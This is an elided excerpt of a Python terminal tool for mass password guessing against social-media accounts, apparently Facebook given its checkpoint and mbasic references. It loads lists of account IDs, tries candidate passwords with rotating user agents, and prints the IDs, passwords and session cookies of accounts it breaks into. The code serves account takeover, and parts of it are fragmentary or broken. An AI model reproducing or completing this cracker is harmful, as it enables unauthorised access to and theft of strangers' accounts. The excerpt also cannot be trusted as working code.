...
print()
print()
token=input('\033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mTOKEN : ')
print('')
print('')
print()
print()
ID=input('\033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mID   : ')
os.system('clear')
...
def menu(my_name,my_id):
	...
	os.system('clear')
	banner()
	print(' \033[1;35m[\033[1;32m1\033[1;35m] \033[1;37mCRACK FILE  ')
	print(' \033[1;35m[\033[1;32m0\033[1;35m] \033[1;37mEXIT  ')
	print()
	_____DYNO__DYNO_____ = input(' \033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mCHOOSE :  ')
	print()
	if _____DYNO__DYNO_____ in ['2']:
		dump_massal()
	elif _____DYNO__DYNO_____ in ['']:
		error()
	elif _____DYNO__DYNO_____ in ['1']:
		File2()
	elif _____DYNO__DYNO_____ in ['']:
		result()
	elif _____DYNO__DYNO_____ in ['0']:
...
def File2():
			try:
				...
				fileX = input(' \033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mINPUT FILE  ')
				print()
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f' \033[1;35m[\033[1;32m1\033[1;35m] \033[1;37mOLD ID  ')
	print(f' \033[1;35m[\033[1;32m2\033[1;35m] \033[1;37mNEW ID  ')
	print(f' \033[1;35m[\033[1;32m3\033[1;35m] \033[1;37mMIX ID  ')
	print()
	hu = input(' \033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mChoose : ')
	print()
	if hu in ['1','01']:
		...
		print(' CHOICE NUMBER ')
		back()
	print(f' \033[1;35m[\033[1;32m1\033[1;35m] \033[1;37mMOBILE  ')
	print()
	
	hc = input(' \033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mChoose : ')
	print()
	if hc in ['1','01']:
...
#	elif hc in ['3','03']:
 # 	method.append('touch')
	...
	_jembot_ = input(' \033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mSHOW APPS (T)  ')
	print()
	if _jembot_ in ['']:
		print(' Chouse ')
		back()
		...
		taplikasi.append('no')
	pwplus=input(' \033[1;35m[\033[1;32m+\033[1;35m] \033[1;37mAUTO PASSWORD (T)  ')
	os.system('clear')
	banner()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r   [ TOM ]  {P}{b}{loop}{P}•{b}{len(id)}{P}   OK : {P}{H}{ok}{P}   CP : {P}{M}{cp}{P}  {bo}{'{:.0%}'.format(loop/float(len(id)))}{asu}  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r   [ 𝗧𝗢𝗠 ]     {P}{b}{loop}{P}  /  {b}{len(id)}{P}  -  𝗢𝗞 - {P}{H}{ok}{P}  -  𝗖𝗣 -{P}{M}{cp}{P}  -  ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "HAMA checkpoint" in po.cookies.get_dict().keys():
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\rTOM¬¬ OK:%s ¬ CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[YAA] ID       : {idf} [HAMA] PASSWORD : {pw}'
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[bold green][ MRBX OK ] ID       : {idf}\n[ MRBX OK ] PASSWORD : {pw}\n[ MRBX OK ][/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]MRBX-XD OK[/bold green]'))
					ok+=1
					break
...
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r[ MRBX ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r\x1b[32m[•] ID {idf} [•] PASS {pw}')
